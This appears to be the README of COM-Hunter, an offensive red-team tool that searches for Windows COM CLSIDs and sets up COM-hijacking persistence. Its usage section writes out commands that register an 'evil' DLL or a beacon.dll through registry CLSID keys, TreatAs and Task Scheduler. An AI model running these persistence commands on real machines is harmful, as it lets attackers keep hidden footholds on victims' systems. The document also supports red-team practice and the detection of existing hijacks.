# COM-Hunter
COM Hijacking VOODOO

COM-hunter is a COM Hijacking persistnce tool written in C# (4.8 .NET Framework)<br /><br />
This tool was inspired during the [RTO course](https://courses.zeropointsecurity.co.uk/courses/red-team-ops) of [@zeropointsecltd](https://twitter.com/zeropointsecltd)

## Features:

- Finds out entry valid CLSIDs in the victim's machine.
- Finds out valid CLSIDs via Task Scheduler in the victim's machine.
- Finds out if someone already used any of those valid CLSIDs in order to do COM persistence (LocalServer32/InprocServer32).
- Finds out if someone already used any of valid CLSID via Task Scheduler in order to do COM persistence (LocalServer32/InprocServer32).
- Tries to do automatically COM Hijacking Persistence with general valid CLSIDs (LocalServer32/InprocServer32).
- Tries to do automatically COM Hijacking Persistence via Task Scheduler.
- Tries to use "TreatAs" key in order to refere to a different component.


## Usage:

```
[+] Usage:

    .\COM-Hunter.exe <mode> <options>

-> General Options:
    -h, --help  Shows help and exits.
    -v, --version   Shows current version and exits.
    -a, --about Shows info, credits about the tool and exits.

-> Modes:
    Search  Search Mode
    Persist Persist Mode

-> Search Mode:
    Get-Entry   Searches for valid CLSIDs entries.
    Get-Tasksch Searches for valid CLSIDs entries via Task Scheduler.
    Find-Persist Searches if someone already used a valid CLSID (Defence).
    Find-Tasksch Searches if someone already used a valid CLSID via Task Scheduler (Defence).

-> Persist Mode:
    General    Uses General method to apply COM Hijacking Persistence in Registry.
    Tasksch    Try to do COM Hijacking Persistence via Task Scheduler.
    TreatAs    Uses TreatAs Registry key to apply COM Hijacking Persistence in Registry.

-> General Usage:
    .\COM-Hunter.exe Persist General <clsid> <full_path_of_evil_dll>

-> Tasksch Usage:
    .\COM-Hunter.exe Persist Tasksch <full_path_of_evil_dll>

-> TreatAs Usage:
    .\COM-Hunter.exe Persist TreatAs <clsid> <full_path_of_evil_dll>

-> Example Usages:
    .\COM-Hunter.exe Search Get-Entry
    .\COM-Hunter.exe Search Find-Persist
    .\COM-Hunter.exe Persist General 'HKCU:Software\Classes\CLSID\...' C:\Users\nickvourd\Desktop\beacon.dll
    .\COM-Hunter.exe Persist Tasksch C:\Users\nickvourd\Desktop\beacon.dll

-> Example Format Valid CLSIDs:
    Software\Classes\CLSID\...
    HKCU:Software\Classes\CLSID\...
    HKCU:\Software\Classes\CLSID\...
    HKCU\Software\Classes\CLSID\...
    HKEY_CURRENT_USER:Software\Classes\CLSID\...
    HKEY_CURRENT_USER:\Software\Classes\CLSID\...
    HKEY_CURRENT_USER\Software\Classes\CLSID\...
```

